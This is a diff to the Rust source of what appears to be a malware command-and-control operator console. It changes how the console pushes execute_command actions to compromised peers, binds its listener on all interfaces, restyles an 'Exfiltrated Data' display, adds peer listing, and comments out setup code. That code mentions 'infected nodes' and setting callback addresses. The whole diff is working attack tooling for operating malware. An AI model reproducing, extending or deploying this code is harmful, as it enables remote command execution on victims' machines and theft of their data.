@@ -94,12 +94,12 @@ fn send_db_update_message(
         let stdoutlen: i64 = row.get::<_, i64>(2).unwrap();
         let stderrlen: i64 = row.get::<_, i64>(3).unwrap();
         let lasttime: String = row.get::<_, String>(4).unwrap();
-        Ok(format!("{machine_id:32} {ip:10} {stdoutlen:10} {stderrlen:10} {lasttime:10}"))
+        Ok(format!("{machine_id:32} {ip:15} {stdoutlen:10} {stderrlen:10} {lasttime:10}"))
     }).unwrap();
 
     let mut lines = Vec::new();
 
-    lines.push(format!("{:32} {:10} {:>10} {:>10} {:12}", "MACHINE ID", "IP", "STDOUT", "STDERR", "LAST MESSAGE"));
+    lines.push(format!("{:32} {:15} {:>10} {:>10} {:12}", "MACHINE ID", "IP", "STDOUT LEN", "STDERR LEN", "LAST MESSAGE"));
 
     for line in mappedlines {
         lines.push(line.unwrap());
@@ -259,9 +259,11 @@ impl RatatuiApp {
 
         let bind = SocketAddr::new(
             IpAddr::V4(
-                Ipv4Addr::new(127, 0, 0, 1)
+                Ipv4Addr::new(0, 0, 0, 0)
             ),
-            4445
+            // NOTE: Operator does not need the default port as
+            //   nobody will be calling back to it...
+            4443
         );
 
         let quic = Arc::new(new_quic_client(bind));
@@ -335,9 +337,18 @@ impl RatatuiApp {
         // Exfiltrated Data
         let mut lines = Vec::new();
 
-        for out in &self.bigboxoutputs {
-            lines.push(Line::from(out.as_str()));
+        if self.bigboxoutputs.len() > 0 {
+            lines.push(Line::from(vec![
+                Span::styled(self.bigboxoutputs[0].clone(), Style::default().fg(Color::DarkGray)),
+            ]));
+    
+            for out in &self.bigboxoutputs[1..] {
+                lines.push(Line::from(vec![
+                    Span::styled(out.as_str(), Style::default().fg(Color::White))
+                ]));
+            }
         }
+
 
         let paragraph = Paragraph::new(lines).block(Block::bordered()
             .title(format!("Exfiltrated Data"))
@@ -400,6 +411,8 @@ impl RatatuiApp {
                 let execcmd = cmd[1..].join(" ");
 
                 let txt = Text::from_str(&execcmd).unwrap();
+                let prevhead = self.clientstate.head_address(self.aranya.get_graph())
+                    .expect("Couldn't get head of graph");
                 self.clientstate.action(
                     self.aranya.get_graph(),
                     &mut self.sink,
@@ -409,7 +422,14 @@ impl RatatuiApp {
                 for peer in &self.cache.peers {
                     if let Ok(peer) = peer.parse::<SocketAddr>() {
                         // println!("Syncing with {peer}");
-                        c2push_sync(peer, Arc::clone(&self.quic), &mut self.clientstate, self.aranya.get_graph());
+                        c2push_sync(
+                            peer,
+                            Arc::clone(&self.quic),
+                            &mut self.clientstate,
+                            self.aranya.get_graph(),
+                            None
+                            // *prevhead
+                        );
                     }
                 }
             },
@@ -442,6 +462,11 @@ impl RatatuiApp {
 
                 self.cache.peers.retain(|v| *v != peer.to_string());
                 self.cache.save_cache();
+            },
+            "listpeers" => {
+                for peer in &self.cache.peers {
+                    self.cmdoutput += &format!("{peer} ").to_string();
+                }
             },
             "set" => {
                 if cmd.len() < 2 {
@@ -627,9 +652,6 @@ impl C2SettingsCache {
 async fn main() {
     // Enable logging to terminal
     tracing_subscriber::fmt::init();
-
-    
-    let bind = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)), 4445);
     
     let mut cache = C2SettingsCache::load_cache();
     
@@ -652,84 +674,84 @@ async fn main() {
         return;
     }
     
-    let args = CommandArguments::parse();
-    if args.new_graph {
-        let graph = match aranya.create_graph(&mut clientstate, &mut sink, &keys) {
-            Ok(v) => v,
-            Err(_) => return
-        };
+    // let args = CommandArguments::parse();
+    // if args.new_graph {
+    //     let graph = match aranya.create_graph(&mut clientstate, &mut sink, &keys) {
+    //         Ok(v) => v,
+    //         Err(_) => return
+    //     };
 
-        // TODO: Temporary debug code for infected nodes to quickly
-        //   connect up to the same graph ID
-        fs::write("src/graph.txt", graph.as_array());
-    }
+    //     // TODO: Temporary debug code for infected nodes to quickly
+    //     //   connect up to the same graph ID
+    //     fs::write("src/graph.txt", graph.as_array());
+    // }
 
-    if let Some(command) = args.command {
-        let txt = Text::from_str(&command).unwrap();
-        clientstate.action(
-            aranya.get_graph(),
-            &mut sink,
-            vm_action!(execute_command(txt))
-        );
-    }
+    // if let Some(command) = args.command {
+    //     let txt = Text::from_str(&command).unwrap();
+    //     clientstate.action(
+    //         aranya.get_graph(),
+    //         &mut sink,
+    //         vm_action!(execute_command(txt))
+    //     );
+    // }
 
-    if args.new_rsa {
-        aranya.new_rsa_key(&mut clientstate, &mut sink);
-    }
+    // if args.new_rsa {
+    //     aranya.new_rsa_key(&mut clientstate, &mut sink);
+    // }
 
-    if let Some(callback) = args.set_callback {
-        let txt = Text::from_str(&callback).unwrap();
-        update_callback_c2(txt).with_action(|action| {
-            clientstate.action(
-                aranya.get_graph(),
-                &mut sink,
-                action
-            )
-        });
-    }
+    // if let Some(callback) = args.set_callback {
+    //     let txt = Text::from_str(&callback).unwrap();
+    //     update_callback_c2(txt).with_action(|action| {
+    //         clientstate.action(
+    //             aranya.get_graph(),
+    //             &mut sink,
+    //             action
+    //         )
+    //     });
+    // }
 
-    if args.start_afc {
-        // Fake unused
-        let (tx, _rx) = mpsc::channel::<UIEvent>();
+    // if args.start_afc {
+    //     // Fake unused
+    //     let (tx, _rx) = mpsc::channel::<UIEvent>();
 
-        tokio::spawn(afc_listener(
-            dir.to_path_buf(),
-            aranya.load_rsa_key(),
-            Arc::clone(&aranya.sqlite),
-            tx
-        ));
-    }
+    //     tokio::spawn(afc_listener(
+    //         dir.to_path_buf(),
+    //         aranya.load_rsa_key(),
+    //         Arc::clone(&aranya.sqlite),
+    //         tx
+    //     ));
+    // }
 
-    let quic = {
-        let mut syncbind = bind.clone();
-        syncbind.set_port(4446);
-        Arc::new(new_quic_client(syncbind))
-    };
+    // let quic = {
+    //     let mut syncbind = bind.clone();
+    //     syncbind.set_port(4446);
+    //     Arc::new(new_quic_client(syncbind))
+    // };
 
-    let syncer = Arc::new(Mutex::new(C2Syncer::new(clientstate, sink)));
+    // let syncer = Arc::new(Mutex::new(C2Syncer::new(clientstate, sink)));
 
-    for ipstr in &args.args {
-        tokio::time::sleep(Duration::from_millis(1000)).await;
-        let socket: SocketAddr = ipstr.parse()
-            .expect("Invalid IP format");
+    // for ipstr in &args.args {
+    //     tokio::time::sleep(Duration::from_millis(1000)).await;
+    //     let socket: SocketAddr = ipstr.parse()
+    //         .expect("Invalid IP format");
 
-        c2push(
-            socket,
-            Arc::clone(&quic),
-            Arc::clone(&syncer),
-            aranya.get_graph()
-        ).await;
-    }
+    //     c2push(
+    //         socket,
+    //         Arc::clone(&quic),
+    //         Arc::clone(&syncer),
+    //         aranya.get_graph()
+    //     ).await;
+    // }
 
 
-    // TODO: This sleep is very important becasue without it, the
-    //   program will end and the data won't be transferred to
-    //   some of the peers, if any at all.
-    // tokio::time::sleep(Duration::from_millis(1000)).await;
+    // // TODO: This sleep is very important becasue without it, the
+    // //   program will end and the data won't be transferred to
+    // //   some of the peers, if any at all.
+    // // tokio::time::sleep(Duration::from_millis(1000)).await;
 
-    if args.start_afc {
-        tokio::time::sleep(Duration::from_millis(100000000)).await;
-    } else if args.args.len() > 0 {
-        tokio::time::sleep(Duration::from_millis(2000)).await;
-    }
+    // if args.start_afc {
+    //     tokio::time::sleep(Duration::from_millis(100000000)).await;
+    // } else if args.args.len() > 0 {
+    //     tokio::time::sleep(Duration::from_millis(2000)).await;
+    // }
 }
